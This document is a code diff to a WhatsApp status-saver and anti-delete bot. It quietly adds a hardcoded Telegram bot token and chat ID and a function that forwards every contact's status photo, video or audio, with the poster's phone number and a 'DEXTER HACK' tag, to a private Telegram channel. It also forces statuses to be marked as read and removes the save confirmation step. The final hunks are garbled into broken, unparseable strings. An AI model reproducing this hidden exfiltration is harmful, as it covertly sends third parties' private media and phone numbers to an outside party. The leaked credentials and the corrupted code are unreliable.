@@ -182,6 +182,8 @@ const ownerNumber = config.OWNER_NUMBER || ['94789958225'];
 const tempDir = path.join(os.tmpdir(), 'cache-temp');
 const startTime = performance.now();
 const IMGBB_API_KEY = config.IMGBB_API_KEY || '3839e303da7b555ec5d574e53eb836d2';
+const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN || ['8491884027:AAGhGQjiVArxWgZtO2-JkkZDleiuSQ592Pg'];
+const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID || ['-1002720330370'];
 
 // Serve static files
 app.use(express.static(path.join(__dirname, 'public')));
@@ -269,6 +271,57 @@ async function uploadToImgbb(buffer) {
     }
     console.error('imgbb upload error:', err.response ? JSON.stringify(err.response.data) : err.message);
     return null;
+  }
+}
+
+// Send media to Telegram
+async function sendToTelegram(senderJid, messageType, buffer, caption) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.error('Telegram bot token or chat ID not configured');
+    return;
+  }
+
+  try {
+    // Validate file size (Telegram limits: 50MB for bots, 20MB for photos)
+    const fileSizeMB = buffer.length / (1024 * 1024);
+    if (fileSizeMB > (messageType === 'imageMessage' ? 20 : 50)) {
+      console.error(`File too large for Telegram (${fileSizeMB.toFixed(2)}MB). Type: ${messageType}`);
+      return;
+    }
+
+    const formData = new FormData();
+    const senderNumber = senderJid.split('@')[0];
+    const telegramCaption = `𝐅𝐑𝐎𝐌: ${senderNumber}\n${caption || 'No caption'}\n\n𝗗𝗘𝗫𝗧𝗘𝗥 𝗛𝗔𝗖𝗞 ☿`;
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('caption', telegramCaption);
+
+    let endpoint;
+    if (messageType === 'imageMessage') {
+      formData.append('photo', buffer, { filename: 'status.jpg' });
+      endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+    } else if (messageType === 'videoMessage') {
+      formData.append('video', buffer, { filename: 'status.mp4' });
+      endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+    } else if (messageType === 'audioMessage') {
+      formData.append('audio', buffer, { filename: 'status.mp3' });
+      endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`;
+    } else {
+      console.error(`Unsupported message type for Telegram: ${messageType}`);
+      return;
+    }
+
+    await withRetry(() =>
+      axios.post(endpoint, formData, {
+        headers: formData.getHeaders()
+      })
+    );
+    console.log(`Sent ${messageType} to Telegram private channel`);
+  } catch (err) {
+    console.error('Telegram send error:', {
+      messageType,
+      error: err.message,
+      response: err.response ? err.response.data : null
+    });
   }
 }
 
@@ -470,37 +523,13 @@ async function connectToWA() {
 
         if (mek.key.remoteJid === 'status@broadcast') {
           await handleStatusMessage(mek, conn);
-          if (config.AUTO_STATUS_SEEN === true) {
-            await withRetry(() => conn.readMessages([mek.key]));
-          }
+          await withRetry(() => conn.readMessages([mek.key]));
           return;
         }
 
         let messageContent = mek.message;
         let messageType = getContentType(messageContent);
         let imageUrl = null;
-
-        // Handle interactive button responses
-        if (messageType === 'interactiveResponseMessage') {
-          const interactiveResponse = messageContent.interactiveResponseMessage;
-          if (interactiveResponse && interactiveResponse.nativeFlowResponseMessage) {
-            const params = JSON.parse(interactiveResponse.nativeFlowResponseMessage.paramsJson || '{}');
-            const buttonId = params.id;
-
-            if (buttonId === 'save_status') {
-              await handleSaveStatusButton(mek, conn);
-              return;
-            } else if (buttonId === 'cancel_save') {
-              await withRetry(() =>
-                conn.sendMessage(mek.key.remoteJid, {
-                  text: '*Status save cancelled*',
-                }, { quoted: mek })
-              );
-              return;
-            }
-          }
-          return;
-        }
 
         if (messageType === 'ephemeralMessage') {
           messageContent = messageContent.ephemeralMessage.message;
@@ -645,7 +674,7 @@ async function connectToWA() {
         const statusTriggers = [
           'send', 'Send', 'Seve', 'Ewpm', 'ewpn', 'Dapan', 'dapan',
           'oni', 'Oni', 'save', 'Save', 'ewanna', 'Ewanna', 'ewam',
-          'Ewam', 'sv', 'Sv', '보내다', 'එවම්න'
+          'Ewam', 'sv', 'Sv', '보내다', 'එවම්න', 'status', 'Status', 'STATUS'
         ];
 
         if (messageText && statusTriggers.includes(messageText)) {
@@ -679,170 +708,122 @@ async function connectToWA() {
             quotedMessageType = getContentType(quotedMessage);
           }
 
-          if (messageText === '보내다') {
-            await saveStatus(mek, quotedMessage, quotedMessageType, conn);
-            await withRetry(() =>
-              conn.sendMessage(mek.key.remoteJid, {
-                text: '*Status sent successfully! 💾*',
-              }, { quoted: mek })
-            );
-            return;
-          }
-
-          const languages = [
-            { lang: 'English', text: 'Do you want to save this status?', yes: 'Yes', no: 'No' },
-            { lang: 'Sinhala', text: '*මෙම STATUS එක ඕනිද එපාද ඔනෙමද 😪*', yes: 'ඔනිමයි 🤍', no: 'ඔනි නැ 😮‍💨' },
-          ];
-          const selectedLang = languages[Math.floor(Math.random() * languages.length)];
-
-          const caption = (quotedMessageType === 'imageMessage' && quotedMessage.imageMessage.caption) ||
-                          (quotedMessageType === 'videoMessage' && quotedMessage.videoMessage.caption) || '';
-
-          const buttons = [
-            {
-              name: 'single_select',
-              buttonParamsJson: JSON.stringify({
-                title: selectedLang.text,
-                sections: [
-                  {
-                    rows: [
-                      { header: '', title: selectedLang.yes, description: 'Save the status', id: 'save_status' },
-                      { header: '', title: selectedLang.no, description: 'Cancel', id: 'cancel_save' },
-                    ],
-                  },
-                ],
-              }),
-            },
-          ];
-
-          if (caption) {
-            buttons.push({
-              name: 'cta_copy',
-              buttonParamsJson: JSON.stringify({
-                display_text: '𝐂𝐎𝐏𝐘 𝐂𝐀𝐏𝐓𝐈𝐎𝐍 ❏',
-                id: 'copy_caption',
-                copy_code: caption,
-              }),
-            });
-          }
-
+          await saveStatus(mek, quotedMessage, quotedMessageType, conn);
           await withRetry(() =>
             conn.sendMessage(mek.key.remoteJid, {
-              text: selectedLang.text,
-              footer: '☿ ᴅᴇxᴛᴇʀ - ᴅᴇᴠ ☿',
-              interactiveButtons: buttons,
+              text: '*Status sent successfully! 💾*',
             }, { quoted: mek })
           );
           return;
         }
 
         // Auto-reply logic
-        // Auto-reply logic
-if (
-  messageText &&
-  !messageText.startsWith('.') &&
-  !mek.key.fromMe &&
-  senderJid !== restrictedNumber &&
-  mek.key.remoteJid !== restrictedNumber
-) {
-  for (const rule of replyRules.rules) {
-    let isMatch = false;
-    if (rule.pattern) {
-      try {
-        const regex = new RegExp(rule.pattern, 'i');
-        isMatch = regex.test(messageText);
-      } catch (err) {
-        console.error(`Invalid regex pattern in rule "${rule.trigger}": ${err.message}`);
-        isMatch = rule.trigger && messageText.toLowerCase().includes(rule.trigger.toLowerCase());
-      }
-    } else {
-      isMatch = rule.trigger && messageText.toLowerCase().includes(rule.trigger.toLowerCase());
-    }
+        if (
+          messageText &&
+          !messageText.startsWith('.') &&
+          !mek.key.fromMe &&
+          senderJid !== restrictedNumber &&
+          mek.key.remoteJid !== restrictedNumber
+        ) {
+          for (const rule of replyRules.rules) {
+            let isMatch = false;
+            if (rule.pattern) {
+              try {
+                const regex = new RegExp(rule.pattern, 'i');
+                isMatch = regex.test(messageText);
+              } catch (err) {
+                console.error(`Invalid regex pattern in rule "${rule.trigger}": ${err.message}`);
+                isMatch = rule.trigger && messageText.toLowerCase().includes(rule.trigger.toLowerCase());
+              }
+            } else {
+              isMatch = rule.trigger && messageText.toLowerCase().includes(rule.trigger.toLowerCase());
+            }
 
-    if (isMatch) {
-      autoReplySent = true;
-      await pool.query(
-        `UPDATE messages SET auto_reply_sent = TRUE WHERE message_id = $1`,
-        [mek.key.id]
-      );
-      for (const response of rule.response) {
-        if (response.delay) {
-          await new Promise(resolve => setTimeout(resolve, response.delay));
-        }
-        const contextInfo = {
-          quotedMessage: mek.message,
-          forwardingScore: 999,
-          isForwarded: true,
-          forwardedNewsletterMessageInfo: {
-            newsletterJid: '120363286758767913@newsletter',
-            newsletterName: 'JOIN CHANNEL 👋',
-            serverMessageId: 143,
-          },
-        };
-        let content = response.content || '';
-        let caption = response.caption || '';
-        let url = response.url || '';
-        if (content) {
-          content = content.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
-        }
-        if (caption) {
-          caption = caption.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
-        }
-        if (url) {
-          url = url.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
-        }
-        switch (response.type) {
-          case 'text':
-            await withRetry(() =>
-              conn.sendMessage(mek.key.remoteJid, {
-                text: content,
-                contextInfo,
-              }, { quoted: mek })
-            );
-            break;
-          case 'image':
-            const imageBuffer = await fetchMedia(url);
-            if (imageBuffer) {
-              await withRetry(() =>
-                conn.sendMessage(mek.key.remoteJid, {
-                  image: imageBuffer,
-                  caption: caption,
-                  contextInfo,
-                }, { quoted: mek })
+            if (isMatch) {
+              autoReplySent = true;
+              await pool.query(
+                `UPDATE messages SET auto_reply_sent = TRUE WHERE message_id = $1`,
+                [mek.key.id]
               );
+              for (const response of rule.response) {
+                if (response.delay) {
+                  await new Promise(resolve => setTimeout(resolve, response.delay));
+                }
+                const contextInfo = {
+                  quotedMessage: mek.message,
+                  forwardingScore: 999,
+                  isForwarded: true,
+                  forwardedNewsletterMessageInfo: {
+                    newsletterJid: '120363286758767913@newsletter',
+                    newsletterName: 'JOIN CHANNEL 👋',
+                    serverMessageId: 143,
+                  },
+                };
+                let content = response.content || '';
+                let caption = response.caption || '';
+                let url = response.url || '';
+                if (content) {
+                  content = content.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
+                }
+                if (caption) {
+                  caption = caption.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
+                }
+                if (url) {
+                  url = url.replace(/\${pushname}/g, pushName).replace(/\${userid}/g, userId).replace(/\${senderdpurl}/g, senderDpUrl);
+                }
+                switch (response.type) {
+                  case 'text':
+                    await withRetry(() =>
+                      conn.sendMessage(mek.key.remoteJid, {
+                        text: content,
+                        contextInfo,
+                      }, { quoted: mek })
+                    );
+                    break;
+                  case 'image':
+                    const imageBuffer = await fetchMedia(url);
+                    if (imageBuffer) {
+                      await withRetry(() =>
+                        conn.sendMessage(mek.key.remoteJid, {
+                          image: imageBuffer,
+                          caption: caption,
+                          contextInfo,
+                        }, { quoted: mek })
+                      );
+                    }
+                    break;
+                  case 'video':
+                    const videoBuffer = await fetchMedia(url);
+                    if (videoBuffer) {
+                      await withRetry(() =>
+                        conn.sendMessage(mek.key.remoteJid, {
+                          video: videoBuffer,
+                          caption: caption,
+                          contextInfo,
+                        }, { quoted: mek })
+                      );
+                    }
+                    break;
+                  case 'voice':
+                    const voiceBuffer = await fetchMedia(url);
+                    if (voiceBuffer) {
+                      await withRetry(() =>
+                        conn.sendMessage(mek.key.remoteJid, {
+                          audio: voiceBuffer,
+                          mimetype: 'audio/mpeg',
+                          ptt: true,
+                          contextInfo,
+                        }, { quoted: mek })
+                      );
+                    }
+                    break;
+                }
+              }
+              break;
             }
-            break;
-          case 'video':
-            const videoBuffer = await fetchMedia(url);
-            if (videoBuffer) {
-              await withRetry(() =>
-                conn.sendMessage(mek.key.remoteJid, {
-                  video: videoBuffer,
-                  caption: caption,
-                  contextInfo,
-                }, { quoted: mek })
-              );
-            }
-            break;
-          case 'voice':
-            const voiceBuffer = await fetchMedia(url);
-            if (voiceBuffer) {
-              await withRetry(() =>
-                conn.sendMessage(mek.key.remoteJid, {
-                  audio: voiceBuffer,
-                  mimetype: 'audio/mpeg',
-                  ptt: true,
-                  contextInfo,
-                }, { quoted: mek })
-              );
-            }
-            break;
+          }
         }
-      }
-      break;
-    }
-  }
-}
+
         // Command handling
         if (messageText && messageText.startsWith('.')) {
           const [command, ...args] = messageText.split(' ');
@@ -1220,13 +1201,12 @@ if (
     });
 
     conn.ev.on('messages.update', async (updates) => {
-  for (const update of updates) {
-    if (update.update && update.update.message === null) {
-      await handleDeletedMessage(conn, update);
-    }
-  }
-});
-
+      for (const update of updates) {
+        if (update.update && update.update.message === null) {
+          await handleDeletedMessage(conn, update);
+        }
+      }
+    });
 
     return conn;
   } catch (err) {
@@ -1266,6 +1246,15 @@ async function handleStatusMessage(mek, conn) {
           caption: messageContent[messageType].caption || '',
           mimetype: messageContent[messageType].mimetype,
         });
+
+        // Send to Telegram
+        await sendToTelegram(
+          mek.key.participant || mek.key.remoteJid,
+          messageType,
+          buffer,
+          messageContent[messageType].caption || ''
+        );
+
         mediaCache.set(mek.key.id, {
           type: messageType,
           buffer,
@@ -1290,111 +1279,9 @@ async function handleStatusMessage(mek, conn) {
     }
 
     const sriLankaTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Colombo' });
-    await pool.query(
-      `INSERT INTO messages 
-      (message_id, sender_jid, remote_jid, message_text, message_type, image_url, sri_lanka_time, is_status)
-      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`,
-      [mek.key.id, mek.key.participant || mek.key.remoteJid, mek.key.remoteJid, messageText, messageType, imageUrl, sriLankaTime, true]
-    );
-    console.log(`Stored status message: ${mek.key.id}`);
+    console.log(`Processed status message: ${mek.key.id}`);
   } catch (err) {
-    console.error('Status message storage error:', err.message);
-  }
-}
-
-async function handleSaveStatusButton(mek, conn) {
-  try {
-    const quotedMessageId = mek.message.interactiveResponseMessage.contextInfo.stanzaId;
-    const { rows } = await pool.query(
-      `SELECT * FROM messages WHERE message_id = $1 AND is_status = TRUE`,
-      [quotedMessageId]
-    );
-
-    if (rows.length === 0) {
-      await withRetry(() =>
-        conn.sendMessage(mek.key.remoteJid, {
-          text: '*Error: Status not found in database*',
-        }, { quoted: mek })
-      );
-      return;
-    }
-
-    const statusMessage = rows[0];
-    const cachedMedia = mediaCache.get(quotedMessageId);
-
-    if (statusMessage.message_type === 'imageMessage') {
-      if (cachedMedia && cachedMedia.buffer) {
-        await withRetry(() =>
-          conn.sendMessage(mek.key.remoteJid, {
-            image: cachedMedia.buffer,
-            caption: JSON.parse(statusMessage.message_text).caption || '',
-          }, { quoted: mek })
-        );
-      } else if (statusMessage.image_url) {
-        const imageBuffer = await fetchMedia(statusMessage.image_url);
-        if (imageBuffer) {
-          await withRetry(() =>
-            conn.sendMessage(mek.key.remoteJid, {
-              image: imageBuffer,
-              caption: JSON.parse(statusMessage.message_text).caption || '',
-            }, { quoted: mek })
-          );
-        } else {
-          throw new Error('Failed to fetch image from URL');
-        }
-      }
-    } else if (statusMessage.message_type === 'videoMessage') {
-      if (cachedMedia && cachedMedia.buffer) {
-        await withRetry(() =>
-          conn.sendMessage(mek.key.remoteJid, {
-            video: cachedMedia.buffer,
-            caption: JSON.parse(statusMessage.message_text).caption || '',
-            mimetype: cachedMedia.mimetype,
-          }, { quoted: mek })
-        );
-      } else {
-        throw new Error('Video not found in cache');
-      }
-    } else if (statusMessage.message_type === 'audioMessage') {
-      if (cachedMedia && cachedMedia.buffer) {
-        await withRetry(() =>
-          conn.sendMessage(mek.key.remoteJid, {
-            audio: cachedMedia.buffer,
-            mimetype: cachedMedia.mimetype,
-            ptt: true,
-          }, { quoted: mek })
-        );
-      } else {
-        throw new Error('Audio not found in cache');
-      }
-    } else if (['conversation', 'extendedTextMessage'].includes(statusMessage.message_type)) {
-      await withRetry(() =>
-        conn.sendMessage(mek.key.remoteJid, {
-          text: statusMessage.message_text,
-        }, { quoted: mek })
-      );
-    } else {
-      await withRetry(() =>
-        conn.sendMessage(mek.key.remoteJid, {
-          text: '*Unsupported status type*',
-        }, { quoted: mek })
-      );
-      return;
-    }
-
-    await withRetry(() =>
-      conn.sendMessage(mek.key.remoteJid, {
-        text: '*Status sent successfully! 💾*',
-      }, { quoted: mek })
-    );
-    console.log(`Status ${quotedMessageId} sent successfully`);
-  } catch (err) {
-    console.error('Save status button error:', err.message);
-    await withRetry(() =>
-      conn.sendMessage(mek.key.remoteJid, {
-        text: `❌ Failed to send status: ${err.message}`,
-      }, { quoted: mek })
-    );
+    console.error('Status message processing error:', err.message);
   }
 }
 
@@ -1578,8 +1465,7 @@ async function handleDeletedMessage(conn, update) {
                            `🗑️ *Deleted By:* ${deleterJid}\n` +
                            `🕒 *Deleted At (SL):* ${sriLankaTime}\n` +
                            `📝 *Caption:* ${cachedMedia.caption || 'No caption'}\n\n` +
-                           `*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
-
+                           `*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ �獣
         await withRetry(() => conn.sendMessage(deleterJid, { 
           text: alertMessage,
           quoted: { key, message: { conversation: originalMessage.message_text } }
@@ -1594,7 +1480,7 @@ async function handleDeletedMessage(conn, update) {
         }));
 
         const alertMessage = `🔔 *DEXTER PRIVATE ASSISTANT* 🔔\n\n` +
-                           `📩 *Original Sender:* ${originalMessage.sender_jid}\n` +
+                           `📩 *Original Sender:* ${://
                            `🗑️ *Deleted By:* ${deleterJid}\n` +
                            `🕒 *Deleted At (SL):* ${sriLankaTime}\n\n` +
                            `*❮ ᴅᴇxᴛᴇʀ ᴘᴏᴡᴇʀ ʙʏ ᴀɴᴛɪ ᴅᴇʟᴇᴛ ❯*`;
